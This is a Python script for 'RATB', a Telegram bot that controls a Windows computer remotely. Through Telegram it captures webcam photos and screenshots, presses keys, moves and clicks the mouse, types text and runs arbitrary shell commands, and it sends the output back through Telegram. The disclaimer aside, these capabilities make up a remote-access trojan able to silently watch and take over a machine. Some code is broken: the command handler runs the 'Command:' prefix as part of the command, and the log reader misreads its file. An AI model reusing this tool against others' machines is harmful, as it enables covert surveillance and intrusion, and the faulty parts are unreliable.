#!/usr/bin/env python3

"""
888b.    db    88888 888b. 
8  .8   dPYb     8   8wwwP 
8wwK'  dPwwYb    8   8   b 
8  Yb dP    Yb   8   888P' 

This is a simple bot for remote computer control via Telegram. It is not intended as a surveillance program.
To configure the bot, you must make your own config from configs/default.json.

https://github.com/superisuer/RATB
"""

# ---------------------------------
# SETTINGS
config_file = "configs/default.json" # JSON Config
# ---------------------------------

import cv2
import os
import logging
import json 

from pyautogui import *
from telebot import *
from telebot import types
from datetime import datetime

try:
    f = open(config_file)
    data = json.loads(f.read()) # Reading from file
    f.close() # Closing file
except Exception as e:
    print(e)
    exit()

# ---------------------------------
# LOAD DATA
token = data["bot_token"]

write_logs = data["write_logs"]
file_logs = data["file_logs"]
mode_logs = data["mode_logs"]
format_logs = data["format_logs"]

users_ids = data["bot_users"]
# ---------------------------------

if write_logs:
	logging.basicConfig(level=logging.INFO, filename=file_logs,filemode=mode_logs, format=format_logs)

rlgs = " "
sysmode = 0
alertmode = 0
writemode = 0
alert = None
bot=telebot.TeleBot(token)

@bot.message_handler(commands=['start'])
def start(message):
    if not message.from_user.id in users_ids:
        return None
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    item1 = types.KeyboardButton("📸 Camera")
    item2 = types.KeyboardButton("🖥 Screenshot")
    item3 = types.KeyboardButton("⌨ Keyboard")
    item4 = types.KeyboardButton("🖱 Mouse")
    item5 = types.KeyboardButton("📜 Logs")
    item6 = types.KeyboardButton("⚙️ Settings")
    markup.add(item1, item2, item3, item4, item5, item6)
    bot.send_message(message.chat.id, "📁 Select option:", reply_markup=markup)
@bot.message_handler(func=lambda message: message.text == "📸 Camera")
def camera_shot(message):
    if not message.from_user.id in users_ids:
        return None
    global rlgs
    if write_logs or write_logs == 1:
        current_datetime = datetime.now()
        print("CAMERA @" + str(message.from_user.username))
        write_data_time = str(current_datetime)
        logging.info("CAMERA @" + str(message.from_user.username))
    cap = cv2.VideoCapture(0)
    ret, frame = cap.read()
    cv2.imwrite("camera1.png", frame)
    cap.release()
    
    photo = open('camera1.png', 'rb')
    bot.send_photo(message.chat.id, photo)
    photo.close()

@bot.message_handler(func=lambda message: message.text == "🖥 Screenshot")
def tg_screenshot(message):
    if not message.from_user.id in users_ids:
        return None
    global rlgs
    if write_logs or write_logs == 1:
        current_datetime = datetime.now()
        write_data_time = str(current_datetime)
        print(write_data_time + " SCREENSHOT @" + str(message.from_user.username))
        logging.info("SCREENSHOT @" + str(message.from_user.username))
    screenshot("screen.png")
    scre = open('screen.png', 'rb')
    bot.send_photo(message.chat.id, scre)

@bot.message_handler(func=lambda message: message.text == "⌨ Keyboard")
def open_keyboard_menu(message):
    if not message.from_user.id in users_ids:
        return None
    global rlgs
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    item31 = types.KeyboardButton("⌨ Enter")
    item32 = types.KeyboardButton("⌨ Backspace")
    item33 = types.KeyboardButton("⌨ Escape")
    item34 = types.KeyboardButton("⌨ Alt+Tab")
    item35 = types.KeyboardButton("⌨ Windows+E")
    backb = types.KeyboardButton("◀ Back")
    markup.add(item31, item32, item33, item34, item35,backb)
    bot.send_message(message.chat.id, "📁 Keyboard: Select option:", reply_markup=markup)

@bot.message_handler(func=lambda message: message.text == "⌨ Enter")
def keyboard_enter(message):
    if not message.from_user.id in users_ids:
        return None
    global rlgs
    press("enter")
    bot.send_message(message.chat.id, "✅ Success!")

@bot.message_handler(func=lambda message: message.text == "⌨ Backspace")
def keyboard_bs(message):
    if not message.from_user.id in users_ids:
        return None
    global rlgs
    press("backspace")
    bot.send_message(message.chat.id, "✅ Success!")

@bot.message_handler(func=lambda message: message.text == "⌨ Escape")
def keyboard_esc(message):
    if not message.from_user.id in users_ids:
        return None
    press("esc")
    bot.send_message(message.chat.id, "✅ Success!")

@bot.message_handler(func=lambda message: message.text == "⌨ Alt+Tab")
def keyboard_alttab(message):
    if not message.from_user.id in users_ids:
        return None
    hotkey('alt', 'tab')
    bot.send_message(message.chat.id, "✅ Success!")

@bot.message_handler(func=lambda message: message.text == "⌨ Windows+E")
def keyboard_win_e(message):
    if not message.from_user.id in users_ids:
        return None
    global rlgs
    hotkey('win', 'e')
    bot.send_message(message.chat.id, "✅ Success!")

@bot.message_handler(func=lambda message: message.text == "🖱 Mouse")
def open_mouse_menu(message):
    if not message.from_user.id in users_ids:
        return None
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    item31 = types.KeyboardButton("🖱 Click")
    item32 = types.KeyboardButton("🖱 Double click") 
    item33 = types.KeyboardButton("🖱 Get position")
    item34 = types.KeyboardButton("🖱 Scroll Down")
    item35 = types.KeyboardButton("🖱 Scroll Up")
    backb = types.KeyboardButton("◀ Back")
    markup.add(item31,item32,item33,item34,item35,backb)
    bot.send_message(message.chat.id, "📁 Mouse: Select option:", reply_markup=markup)

@bot.message_handler(func=lambda message: message.text == "🖱 Click")
def tg_click(message):
    if not message.from_user.id in users_ids:
        return None
    global rlgs
    click()

@bot.message_handler(func=lambda message: message.text == "🖱 Scroll Down")
def tg_click(message):
    if not message.from_user.id in users_ids:
        return None
    global rlgs
    scroll(-400)

@bot.message_handler(func=lambda message: message.text == "🖱 Scroll Up")
def tg_click(message):
    if not message.from_user.id in users_ids:
        return None
    global rlgs
    scroll(400)

@bot.message_handler(func=lambda message: message.text == "🖱 Get position")
def tg_getposition(message):
    if not message.from_user.id in users_ids:
        return None
    global rlgs
    bot.send_message(message.chat.id, "✅ {}".format(position()))

@bot.message_handler(func=lambda message: message.text == "🖱 Double click")
def tg_dclick(message):
    if not message.from_user.id in users_ids:
        return None
    global rlgs
    doubleClick()

@bot.message_handler(func=lambda message: message.text == "📜 Logs")
def open_logs(message):
    if not message.from_user.id in users_ids:
        return None
    global rlgs
    logf = open("logs.log", "r")
    for line in logf:
        try:
            bot.send_message(message.chat.id, logf.readlines())
            if logf.readlines() == "":
                bot.send_message(message.chat.id, "❌ Логи пустые")
        except:
            bot.send_message(message.chat.id, "❌ Неизвестная ошибка")

@bot.message_handler(func=lambda message: message.text == "⚙️ Settings")
def open_settings_menu(message):
    if not message.from_user.id in users_ids:
        return None
    global rlgs
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    item63 = types.KeyboardButton("🌐 Language")
    backb = types.KeyboardButton("◀ Back")
    markup.add(item63,backb)
    bot.send_message(message.chat.id, "📁 Keyboard: Select option:", reply_markup=markup)

@bot.message_handler(func=lambda message: message.text == "🌐 Language")
def language_change(message):
    global rlgs
    if not message.from_user.id in users_ids:
        return None
    bot.send_message(message.chat.id, "🌐 Language will be soon...")
    
@bot.message_handler(func=lambda message: message.text == "◀ Back")
def tg_back(message):
    start(message)

@bot.message_handler(content_types='text')
def message_reply(message1):
    if not message1.from_user.id in users_ids:
        return None
    global rlgs
    if message1.text.startswith("Alert:"):
        alert(message1.text)
        bot.send_message(message1.chat.id, "📢 Success!")
    elif message1.text.startswith("Write:"):
        write(message1.text, interval=0.0001)
        bot.send_message(message1.chat.id, "⌨ Success!")
    elif message1.text.startswith("Command:"):
        a = os.popen(message1.text).readlines()
        bot.send_message(message1.chat.id, f"🛡 {a}")

bot.infinity_polling(none_stop=True)